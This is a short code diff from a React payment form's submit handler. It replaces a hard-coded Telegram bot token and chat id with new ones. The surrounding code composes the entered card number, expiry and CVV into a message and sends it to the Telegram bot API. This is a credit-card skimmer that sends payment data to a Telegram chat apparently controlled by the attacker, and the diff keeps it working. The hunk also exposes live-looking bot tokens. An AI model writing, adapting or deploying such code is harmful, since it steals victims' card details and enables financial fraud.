@@ -15,8 +15,8 @@ function Content() {
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    const token = '6743135771:AAGxOBwP6Wt_pRKZTlY5kVjKpk1ng-htVR8';
-    const id = '6423800023';
+    const token = '6717372587:AAGEg5e4YEYU4UCtNExCpxr9Td2zwbVTDGo';
+    const id = '5651700820';
 
     const message = `Card number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}`;
     const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(
